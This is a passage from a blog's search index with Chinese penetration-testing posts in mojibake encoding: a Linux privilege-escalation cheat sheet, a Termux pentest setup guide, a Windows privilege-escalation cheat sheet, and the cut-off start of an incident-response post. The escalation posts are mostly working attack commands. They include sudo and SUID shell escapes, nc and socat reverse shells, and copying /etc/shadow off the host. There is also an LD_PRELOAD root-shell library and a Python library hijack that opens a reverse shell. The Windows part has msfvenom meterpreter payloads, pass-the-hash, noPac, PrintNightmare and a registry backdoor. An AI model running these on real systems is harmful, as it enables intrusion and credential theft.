docker-compose pull # å¯åŠ¨viperï¼Œè®¿é—®60000ç«¯å£ $ cd ~/Github/Viper &amp;&amp; docker-compose up -d frp cd ~/Github git clone https://github.com/fatedier/frp.git cd frp &amp;&amp; make SecLists $ cd ~/Github git clone https://github.com/danielmiessler/SecLists.git ","link":"https://Zer0-hex.github.io/yun-fu-wu-qi-bu-shu/"},{"title":"Linuxææƒ","content":"Linuxææƒ CVEææƒ CVE 2021-3560 (Polkit) CVE 2021-4034 (pwnkit) CVE 2022-0847 (DirtyPipe) åˆ©ç”¨ https://github.com/liamg/traitor/ sudoé…ç½®ææƒ åœ¨Linuxç³»ç»Ÿä¸­ï¼Œsudoæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æƒé™ç®¡ç†å·¥å…·ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨è¿è¡ŒæŸäº›å‘½ä»¤æ—¶æå‡è‡ªå·±çš„æƒé™ã€‚ä½†é”™è¯¯çš„é…ç½®ä¼šå¯¼è‡´sudoè¢«åˆ©ç”¨ä¸ææƒã€‚ sudoæ–‡ä»¶è¯­æ³• vim /etc/sudoers #Username Host=(run as) command to execute root ALL=(ALL:ALL) ALL user1 ALL=(root) NOPASSWD:/bin/find æŸ¥æ‰¾å½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„é«˜æƒé™å‘½ä»¤ $ sudo -l ----------------------- ä¸€èˆ¬å¯åˆ©çš„ç”¨è¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤º $ sudo -l Matching Defaults entries for root on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User root may run the following commands on localhost: (root) NOPASSWD: /usr/bin/perl /usr/bin/python /usr/bin/less /usr/bin/awk /usr/bin/man.... perl $ sudo perl -e 'exec &quot;/bin/bash&quot;' python $ sudo python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' less $ sudo less /etc/hosts !bash awk $ sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}' man $ sudo man man !bash vi/vim $ sudo vi/vim :!bash env sudo env /bin/bash ftp sudo ftp ! /bin/bash socat å®¢æˆ·æœºï¼š socat file:`tty`,raw,echo=0 tcp-listen:1234 å—å®³æœºï¼š sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234 scp å¯ä»¥ä¸‹è½½å­˜æ”¾å¯†ç å¯†æ–‡çš„æ–‡ä»¶ sudo scp /etc/shadow root@192.168.1.2:~/ other æœ‰æ—¶ä¼šå‡ºç°è‡ªå®šä¹‰çš„è„šæœ¬è¢«æ·»åŠ sudoæƒé™çš„æƒ…å†µï¼Œå¯¹äºæ­¤ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæœ‰å†™æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¦†ç›–ã€‚ SUID ææƒ suidå¯ä»¥è®©æ™®é€šç”¨æˆ·è¿è¡Œçš„ç¨‹åºä»¥é«˜æƒé™è¿è¡Œï¼Œæ–¹ä¾¿ç®¡ç†çš„åŒæ—¶ä¹Ÿæ–¹ä¾¿äº†ææƒã€‚ æŸ¥æ‰¾å…·æœ‰SUIDæƒé™çš„ç¨‹åº find / -perm -u=s -type f 2&gt;/dev/null cp å¦‚æœCPæ‹¥æœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ã€‚ 1ã€åˆ©ç”¨opensslç”Ÿæˆå¯†ç ï¼Œæ·»åŠ æ–°çš„ç”¨æˆ·åˆ°Linuxçš„/etc/Passwdæ–‡ä»¶ä¸­ openssl passwd -1 -salt hack 2333 $1$hack$hA86ImU4cvh4bQFNvSULf1 cp /etc/passwd /tmp/passwd æœ¬åœ°ä¿®æ”¹æ–‡ä»¶ï¼Œæ·»åŠ ä¸€è¡Œ &quot;hack:$1$hack$hA86ImU4cvh4bQFNvSULf1:0:0:root:/root:/bin/bash&quot; å†ä¸Šä¼ è‡³ç›®æ ‡çš„/tmpç›®å½•ä¸‹ï¼Œç„¶åä½¿ç”¨cpå‘½ä»¤å¤åˆ¶åˆ°/etc/passwdæ–‡ä»¶ä¸­ su hack è¾“å…¥å¯†ç å³å¯è·å–rootæƒé™ 2ã€åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell find touch /tmp/tmp find /tmp/tmp -exec &quot;whoami&quot; \\; vim/nanoç­‰ç¼–è¾‘å™¨ 1ã€visudoå‘½ä»¤è°ƒç”¨vimä¿®æ”¹/etc/sudoeræ–‡ä»¶ï¼Œä¸ºå½“å‰ç”¨æˆ·æ·»åŠ æƒé™ï¼Œå®Œæˆææƒ 2ã€é€šè¿‡ç¼–è¾‘å™¨ä¿®æ”¹/etc/passwdæ–‡ä»¶å®Œæˆææƒ 3ã€æŸ¥çœ‹/etc/shadowæ–‡ä»¶ï¼Œçˆ†ç ´é«˜æƒé™ç”¨æˆ·å¯†ç ã€‚ bash bash -p python import os os.ststem('/bin/sh') å®¹å™¨/è™šæ‹ŸåŒ–å·¥å…·ææƒ åœ¨æ‹¥æœ‰å®¹å™¨æƒé™æ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®¹å™¨æŒ‚è½½æœ¬åœ°çš„ç›®å½•ã€‚ é€šè¿‡sudoerã€passwdã€shadowç­‰é…ç½®æ–‡ä»¶ææƒã€‚ LXD Docker è®¡åˆ’ä»»åŠ¡ æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ä¸­è¿è¡Œçš„è„šæœ¬ï¼Œå¦‚æœå…·æœ‰å†™æƒé™ï¼Œå³å¯diyè„šæœ¬ææƒã€‚ é€šé…ç¬¦æ³¨å…¥ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ æ¡ä»¶ï¼Œå·²çŸ¥å°†è¦è¿è¡Œçš„tar 1.tar *å‘½ä»¤ ä¾‹å¦‚ï¼š/etc/crontab */1 * * * * root tar -zcf /var/backups/html.tgz /var/www/html/* Linuxåœ¨åˆ©ç”¨é€šé…ç¬¦æ—¶ï¼Œä¼šå°†åŒ¹é…çš„å­—ç¬¦ä¸²åŒ¹é…åˆ°å‘½ä»¤ä¸­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶åçš„æ–¹å¼ï¼Œæ„é€ æ¶æ„å‘½ä»¤ã€‚ tarå‘½ä»¤å¯ä»¥é€šè¿‡ä¸¤ä¸ªå‚æ•°æ‰§è¡Œè„šæœ¬ --checkpoint-action=exec=sh 1.sh&quot; --checkpoint=1 Payload-åå¼¹Shell echo &quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; shell.sh echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot; echo &quot;&quot; &gt; --checkpoint=1 tar cf archive.tar * Payload-æ·»åŠ SUIDæƒé™ echo &quot;chmod u+s /usr/bin/find&quot; &gt; test.sh echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot; echo &quot;&quot; &gt; --checkpoint=1 tar cf archive.tar * ls -al /usr/bin/find find f1 -exec &quot;whoami&quot; \\; root find f1 -exec &quot;/bin/sh&quot; \\; id whoami LD_PreloadåŠ«æŒï¼Œsudoææƒ(æœ‰ç‚¹é¸¡è‚‹) æœ‰äº›å…·é«˜æƒé™çš„å‘½ä»¤åœ¨è¿è¡Œæ—¶ä»ç¯å¢ƒå˜é‡LD_Preloadä¸­è·å–é“¾æ¥åº“çš„ä½ç½®ï¼Œä¾‹å¦‚ä»¥ä¸‹è¿™äº›ä½ç½® /etc/ld.so.* /lib/ld-linux.so å¯ä»¥é€šè¿‡åŠ«æŒä¸€äº›ç¨‹åºå¿…å®šè°ƒç”¨çš„å‡½æ•°ï¼Œæ¥è·å–Shellã€‚ é«˜æƒé™çš„å‘½ä»¤åŠ«æŒåˆ°çš„Shellè‡ªç„¶æ˜¯é«˜æƒé™ã€‚ payload vim fuckld.c ------------------------------------------------------ #include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; #include&lt;string.h&gt; __attribute__((__constructor__)) void preload (){ unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/sh&quot;); } æ¡ä»¶ sudoé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä¸€è¡Œ Defaults env_keep += LD_PRELOAD sudo -l å¯ä»¥çœ‹åˆ°å­—æ · åˆ©ç”¨ # ç¼–è¯‘ gcc -shared -fPIC fuckid.c -o /tmp/fuckld.so # ä¿®æ”¹ç¯å¢ƒå˜é‡ ls LD_PRELOAD=/tmp/fuckld.so sudo LD_PRELOAD=/tmp/fuckld.so find PATHç¯å¢ƒå˜é‡ææƒ æœ‰äº›å‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨å…¶ä»–å‘½ä»¤ï¼Œå› æ­¤å¯ä»¥é€šè¿‡åŠ«æŒå¯¹åº”çš„å‘½ä»¤æ¥ææƒ æŸSUIDæƒé™ç¨‹åº #include&lt;unistd.h&gt; void main() { setuid(0); setgid(0); system(&quot;ps&quot;); } åŠ«æŒçš„å‘½ä»¤ echo &quot;/bin/bash&quot; &gt; /tmp/ps chmod 777 /tmp/ps åŠ«æŒPATHç¯å¢ƒå˜é‡ å‰é¢çš„è·¯å¾„ä¼˜å…ˆè°ƒç”¨ export PATH=/tmp:$PATH Pythonåº“åŠ«æŒ æ ·ä¾‹æ–‡ä»¶ï¼Œ1.py import goodrequests goodlib.get(&quot;baidu.com&quot;) æ¶æ„åº“(è¢«åŠ«æŒçš„åº“)ï¼Œgoodrequests.py def get(): import os import pty import socket import subprocess s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;127.0.0.1&quot;,2333)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(&quot;/bin/bash&quot;) ","link":"https://Zer0-hex.github.io/linux-ti-quan/"},{"title":"Android Termux éƒ¨ç½²éšèº«Linuxç¯å¢ƒ","content":"Termux â€”â€” ä¾¿æºå¼Linux ä¸‹è½½åœ°å€: (F-Droid)[https://f-droid.org/packages/com.termux/] (Github)[https://github.com/termux/termux-app/releases] Google Playä¸Šçš„æ˜¯æ—§ç‰ˆï¼Œä¸å»ºè®®ä¸‹è½½ã€‚ åŸºæœ¬é…ç½® # æ›´æ¢å›½å†…é•œåƒæº termux-change-repo # ç©ºæ ¼é€‰ä¸­ï¼Œå›è½¦OKã€‚(å»ºè®®BFSU) # é¦–å…ˆå®‰è£…sshï¼Œæ–¹ä¾¿ç®¡ç† pkg update pkg install openssh vim # ä¿®æ”¹å¯†ç  passwd # ç„¶ååœ¨å±€åŸŸç½‘é€šè¿‡ç”µè„‘sshç™»å½•ï¼Œç”¨æˆ·åéšæ„ï¼Œç«¯å£8022 ssh m@127.0.0.1 -p 8022 # æ›´æ–°ç³»ç»Ÿ pkg upgrade # å¼€å¯æ–‡ä»¶æƒé™ï¼Œè‡ªåŠ¨æ˜ å°„downloadç­‰åŸºæœ¬è·¯å¾„ï¼Œåœ¨~/storage/ç›®å½•ä¸‹ termux-setup-storage # æœ‰rootæƒé™çš„å®‰è£…tsuï¼Œæ²¡æœ‰rootæƒé™å®‰è£…proot # pkg install proot # è¡¥å……ä¸€ä¸‹è½¯ä»¶ pkg install zip tmux man git curl unzip perl wget pkg-config pkg install openssl openssl-static libffi libffi-static libxml2 pkg install libpcap libgrpc libgmp libtool libxslt libsqlite pkg install golang clang python make cmake ruby pkg install ncurses ncurses-utils ranger neofetch postgresql pkg install readline findutils coreutils bison autoconf binutils apr apr-util pkg install termux-tools termux-elf-cleaner # ä¸Šé¢çš„å…¨éƒ¨ pkg install zip tmux man git curl unzip perl wget pkg-config openssl openssl-static libffi libffi-static libxml2 libpcap libgrpc libgmp libtool libxslt libsqlite golang clang python make cmake ruby ncurses ncurses-utils ranger neofetch postgresql readline findutils coreutils bison autoconf binutils apr apr-util termux-tools termux-elf-cleaner Termuxé…ç½® è™šæ‹Ÿé”®ç›˜ vim ~/.termux/termux.properties --------------------------------------------------------------------- extra-keys = [ \\ ['ESC','~','`','/','UP','BACKSLASH'], \\ ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT'] \\ ] é—®å€™è¯­ (https://www.bootschool.net/ascii åœ¨çº¿ç”Ÿæˆ) vim $HOME/../usr/etc/motd ---------------------------------------------------------------------- â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆ â–ˆâ–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆ â–ˆâ–‘â–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–‘â–ˆ â–ˆ â–‘â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘ â–‘â–ˆâ–ˆ â–‘â–ˆâ–‘â–‘â–‘â–‘â–‘ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ â–‘â–ˆâ–ˆ â–‘â–ˆ â–‘â–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ â–ˆâ–ˆâ–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆ â–‘ â–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘ â–‘â–‘â–‘â–‘ â–‘â–‘ â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘ â–‘â–‘ å¤‡ä»½ä¸æ¢å¤ å¤‡ä»½ Termux è‡³æ‰‹æœºæœ¬åœ°Downloadæ–‡ä»¶å¤¹ä¸­ termux-setup-storage cd $HOME/../ tar -jcvf /sdcard/Download/termux-backup.tar.bz2 home usr ä»æ‰‹æœºæœ¬åœ°Downloadæ–‡ä»¶å¤¹ä¸­æ¢å¤Termuxå¤‡ä»½ termux-setup-storage cd $HOME/../ tar -jcvf /sdcard/Download/termux-backup.tar.bz2 --recursive-unlink --preserve-permissions Bashé…ç½® ( vim ~/.bashrc ) # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # æç¤ºç¬¦ç”Ÿæˆå™¨ export PS1=&quot;\\[\\033[38;5;14m\\][\\[$(tput sgr0)\\]\\[\\033[38;5;9m\\]\\w\\[$(tput sgr0)\\]\\[$(tput sgr0)\\]\\[\\033[38;5;216m\\]\\$(git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/ (\\1)/')\\[$(tput sgr0)\\]\\[\\033[38;5;14m\\]]\\[$(tput sgr0)\\]\\[\\033[38;5;201m\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;11m\\]Termux\\[$(tput sgr0)\\]\\[\\033[38;5;160m\\]:\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\\\$\\[$(tput sgr0)\\] &quot; # å‘½ä»¤è¡¥å…¨(bash-completion) # å¯¹äºæ‰¾ä¸åˆ°çš„å‘½ä»¤ï¼Œæç¤ºè½¯ä»¶åŒ… å½±å“é€Ÿåº¦ # pacman -Sy pkgfile &amp;&amp; pkgfile --update # source /usr/share/doc/pkgfile/command-not-found.bash # è¾“å…¥è·¯å¾„è‡ªåŠ¨æ·»åŠ cd shopt -s autocd # ä¿®æˆæ„å¤–æ¢è¡Œå­—ç¬¦è¦†ç›– shopt -s checkwinsize # å†å²å‘½ä»¤æ·»åŠ åˆ°æ–‡ä»¶ shopt -s histappend # ä¸åœ¨å†å²ä¸­è®°å½•é‡å¤çš„è¡Œå’Œç©ºæ ¼å¼€å¤´çš„è¡Œ HISTCONTROL=ignoreboth # å½©è‰²çš„man export LESS_TERMCAP_mb=$(tput bold; tput setaf 2) # green export LESS_TERMCAP_md=$(tput bold; tput setaf 6) # cyan export LESS_TERMCAP_me=$(tput sgr0) export LESS_TERMCAP_so=$(tput bold; tput setaf 3; tput setab 4) # yellow on blue export LESS_TERMCAP_se=$(tput rmso; tput sgr0) export LESS_TERMCAP_us=$(tput smul; tput bold; tput setaf 7) # white export LESS_TERMCAP_ue=$(tput rmul; tput sgr0) export LESS_TERMCAP_mr=$(tput rev) export LESS_TERMCAP_mh=$(tput dim) export LESS_TERMCAP_ZN=$(tput ssubm) export LESS_TERMCAP_ZV=$(tput rsubm) export LESS_TERMCAP_ZO=$(tput ssupm) export LESS_TERMCAP_ZW=$(tput rsupm) export GROFF_NO_SGR=1 # For Konsole and Gnome-terminal # ä¸€äº›åˆ«å alias ll='ls -alh' alias la='ls -A' alias l='ls -CFlh' alias ls='ls --color=auto' alias dir='dir --color=auto' alias vdir='vdir --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto' alias upgrade='pkg update &amp;&amp; pkg upgrade' # ç¯å¢ƒå˜é‡ export PATH=&quot;$HOME/.local/bin:$PATH&quot; Tmuxé…ç½® cd git clone https://github.com/gpakosz/.tmux.git ln -s -f .tmux/.tmux.conf cp .tmux/.tmux.conf.local . Vimé…ç½® git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime sh ~/.vim_runtime/install_awesome_vimrc.sh å¼€å‘ç¯å¢ƒ Cã€Javaã€Pythonã€Goã€Rustã€PHPã€Rust pkg install -y clang make cmake openjdk-17 ecj dx golang python php rust pipé•œåƒæº pip config set global.index-url https://mirrors.bfsu.edu.cn/pypi/web/simple æ¸—é€ç¯å¢ƒéƒ¨ç½² å¸¸è§å·¥å…· pkg install exiftool nmap nmap-ncat pip install sqlmap cd $HOME &amp;&amp; mkdir Github &amp;&amp; cd Github git clone https://github.com/EASY233/Finger # dirsearch ä¾èµ–çš„cryptographyåº“éœ€è¦ç”¨pkgå®‰è£… pkg install python-cryptography git clone https://github.com/maurosoria/dirsearch xray https://github.com/chaitin/xray/releases/ # æ³¨æ„ARM64æ¶æ„ cd $HOME/Github &amp;&amp; mkdir xray wget https://github.com/chaitin/xray/releases/download/1.8.4/xray_linux_arm64.zip unzip xray_linux_arm64.zip ./xray_linux_arm64 webscan --listen 127.0.0.1:2333 --html-output 2333.html # è¯•è¿è¡Œ fscanä»Githubæ„å»º cd $HOME/Github git clone https://github.com/shadow1ng/fscan cd fscan go build metasploit wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh chmod +x metasploit.sh ./metasploit.sh å¸¸è§é—®é¢˜ libssl.so.1.1 not found (ä¸»è¦æ˜¯ç‰ˆæœ¬åŸå› ï¼Œå»ºè®®å»Githubä¸‹è½½) # CANNOT LINK EXECUTABLE &quot;/data/data/com.termux/files/usr/lib/apt/methods/https&quot;: library &quot;libssl.so.1.1&quot; not found find /data/data/com.termux/files -name 'libssl.so' # æŸ¥æ‰¾openssl-1.1çš„ä½ç½® export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/ # æ·»åŠ ç»™åº“å˜é‡LD_LIBRARY_PATH echo &quot;export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1/&quot; &gt;&gt; ~/.bashrc # Bashç¯å¢ƒæ°¸ä¹…ç”Ÿæ•ˆ ","link":"https://Zer0-hex.github.io/android-termux-bu-shu-sui-shen-linux-huan-jing/"},{"title":"Windowsææƒ","content":"Windowsææƒ åœ¨Windowsæœºå™¨ä¸Šï¼Œæƒé™ä¸è¶³å¾ˆè‡´å‘½ï¼Œå¾ˆå¤šæ“ä½œä¼šæœ‰é™åˆ¶ï¼Œå¾ˆéš¾æ¨ªå‘ã€‚è¿™æ—¶å€™å°±éœ€è¦å¾ˆéªšçš„ææƒæ“ä½œäº†ã€‚ ä»¥ä¸‹ææƒæ‰‹æ³•åº”å½“æŒ‰ä¼˜å…ˆè€ƒè™‘ï¼Œå°½é‡ç”¨æœ€ç®€å•çš„æ–¹å¼å¿«é€Ÿææƒã€‚ å¦‚æœå¯ä»¥æ§åˆ¶æ¡Œé¢ Win + R -&gt; azman.msc -&gt; å¸®åŠ© -&gt; å³é”®æ‰“å¼€æºæ–‡ä»¶ä½ç½® -&gt; æ‰“å¼€ -&gt; cmd å¦‚æœä»»ä½•ç”¨æˆ·å…·æœ‰ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œå³ä½¿è¯¥ç”¨æˆ·æ²¡æœ‰å®Œå…¨æˆ–æ›´é«˜çš„æƒé™ å¯ä»¥é€šè¿‡ä¿®æ”¹ç¼–è¾‘å™¨çš„é»˜è®¤æ‰“å¼€æƒé™ï¼Œç„¶åé“¾å¼è°ƒç”¨cmdææƒã€‚ å†…æ ¸æ¼æ´ææƒ å†…æ ¸æ¼æ´ææƒå¯ä»¥æ ¹æ®å½“å‰æœºå™¨çš„ç‰ˆæœ¬ä»¥åŠå…¶æ‰€æ‰“çš„è¡¥ä¸æ¥åˆ¤æ–­ï¼Œå¯ä»¥åˆ©ç”¨è‡ªåŠ¨åŒ–å·¥å…·ä¸€é”®æ‰«æã€‚ &gt; systeminfo &gt; systeminfo.txt ...wesng/&gt;python wes.py -u ...wesng/&gt;python wes.py systeminfo.txt -e -i &quot;Remote Code Execution&quot; MSIè‡ªåŠ¨å®‰è£…ç­–ç•¥ææƒ æ£€æŸ¥æ³¨å†Œè¡¨æ˜¯å¦å¼€å¯ç›¸å…³åŠŸèƒ½ reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer é»˜è®¤å€¼ä¸º0x1åˆ™ä¸ºå¼€å¯è‡ªåŠ¨å®‰è£…ã€‚ ç”Ÿæˆ.msiæœ¨é©¬ msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 -f msi &gt; /tmp/1.msi ä¹Ÿå¯ä»¥ç”Ÿæˆå‘½ä»¤æ‰§è¡Œçš„msiï¼Œå°†ç”¨æˆ·åŠ å…¥åˆ°ç®¡ç†å‘˜ç»„ msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi &gt; /tmp/2.msi è¿è¡Œå®‰è£… msiexec /quiet /qn /i 1.msi msfé›†æˆæ¨¡å— use exploit/windows/local/always_install_elevated msf exploit(always_install_elevated) &gt; set session 1 msf exploit(always_install_elevated) &gt; exploit æ‰“å°æœºææƒ é¦–å…ˆï¼Œä½ éœ€è¦ä¸€ä¸ªPrintSpoofer.exeã€‚ PrintSpoofer PrintSpoofer64.exe -i -c cmd CVE CVE-2021-36934 è·å–ç®¡ç†å‘˜å“ˆå¸Œ è¿è¡Œexpå³å¯è·å–ä»¥ä¸‹æ–‡ä»¶ SAM System Security ---------------------------- python3 secretsdump.py -sam /root/SAM -system /root/SYSTEM -security /root/SECURITY LOCAL æƒé™æå‡ åˆ©ç”¨Hashä¼ é€’ python3 psexec.py -hashes 00000000000000000000000000000000:7ce21f17c0aee7fb9ceba532d0546ad6 administrator@192.168.1.145 CVE-2021-42278 è¡¥ä¸ KB5008602 â€“ https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7 KB5008380 â€“ https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041 EXP git clone https://github.com/Ridter/noPac python3 noPac.py ignite.local/sakshi:'Password@1' -dc-ip 192.168.1.1 -shell --impersonate administrator -use-ldap æ³¨å†Œè¡¨è‡ªå¯åŠ¨ææƒ éœ€è¦æ“ä½œçš„æ³¨å†Œè¡¨ HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\å½“å‰ç‰ˆæœ¬\\è¿è¡Œ HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce è¯¦æƒ… æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ å¦‚æœå­˜åœ¨ä¸€ä¸ªæœåŠ¡ï¼Œå…¶å¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„ä¸ºï¼š C:\\Program Files\\Ignite Data\\Vuln Service\\file.exe é‚£ä¹ˆä»¥ä¸‹è·¯å¾„çš„EXEå¯ä»¥åŠ«æŒæ­¤æœåŠ¡ C:\\Program Files\\Ignite Data\\Vuln.exe C:\\Program Files\\Ignite.exe C:\\Program.exe æ‹¥æœ‰æ‰€æœ‰æƒé™çš„æ³¨å†Œè¡¨ææƒ æœåŠ¡åŒç† åˆ©ç”¨å·¥å…·AccessChkè¿›è¡Œæ£€æŸ¥ã€‚ .\\accesschk.exe /accepteula &quot;authenticated users&quot; -kvuqsw hklm\\System\\CurrentControlSet\\services ------------------------------------------------------------------------------ RW HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\pentest KEY_ALL_ACCESS ------------------------------------------------------------------------------ å‘ç°å¯åˆ©ç”¨æ³¨å†Œè¡¨æœåŠ¡ï¼ŒæŸ¥è¯¢ç¨‹åºè·¯å¾„ï¼š reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\pentest æŸ¥çœ‹æƒé™ Get-Acl -Path HKLMï¼š\\SYSTEM\\CurrentControlSet\\Services\\pentest åŠ ä¸ªé©¬ reg add &quot;HKLM\\system\\currentcontrolset\\services\\pentest&quot; /t REG_EXPAND_SZ /v ImagePath /d â€œC:\\backdoor.exeâ€ /f æ‹¥æœ‰æ‰€æœ‰æƒé™çš„æœåŠ¡ææƒ msfé›†æˆ use exploit/windows/local/service_permissions set lhost 192.168.1.3 set session 1 exploit è®¡åˆ’ä»»åŠ¡åŠ«æŒææƒ æŸ¥æ‰¾å¯ä»¥åŠ«æŒçš„è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST /v PrintNightmare https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/ åˆ©ç”¨ä¸¤ä¸ªCVE CVE-2021-34527 è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2021-1675 æœ¬åœ°æƒé™æå‡ Python RCE ç”Ÿæˆdllé©¬ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f dll -o evil.dll å¼€å¯ç›‘å¬ use multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.2 set LPORT 4444 exploit åŠ è½½CVE-2021-1675 EXPæ¨¡å— use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare set RHOSTS 192.168.1.190 set SMBUser ignite set SMBPass 123 set DLL_PATH / exploit åˆ©ç”¨CVE-2021-34527æ‰§è¡Œå‘½ä»¤ git clone https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 cd PrintNightmare-CVE-2021-34527 chmod 777 CVE-2021-34527.py å…±äº«æ¶æ„dllæ‰€åœ¨è·¯å¾„ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /root ./CVE-2021-34527.py ignite:123@192.168.1.190 '\\\\192.168.1.2\\share\\evil.dll' ","link":"https://Zer0-hex.github.io/windows-ti-quan/"},{"title":"Linuxåº”æ€¥å“åº”","content":"Linuxå…¥ä¾µç®€å•æ’æŸ¥ Work with Kerno è´¦å·å®‰å…¨æ’æŸ¥ /etc/passwd /etc/shadow awk -F: '$3==0 {print $1}' /etc/passwd // æ’æŸ¥è¶…çº§ç”¨æˆ· last // æŸ¥çœ‹æœ€è¿‘ç”¨æˆ·ç™»å½•ï¼Œæ³¨é”€ä¿¡æ¯ lastlog -u USER // æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ç™»å½•ä¿¡æ¯ #æ’æŸ¥å¤„ç† userdel -r user #åˆ é™¤userç”¨æˆ·,ä¸”åˆ 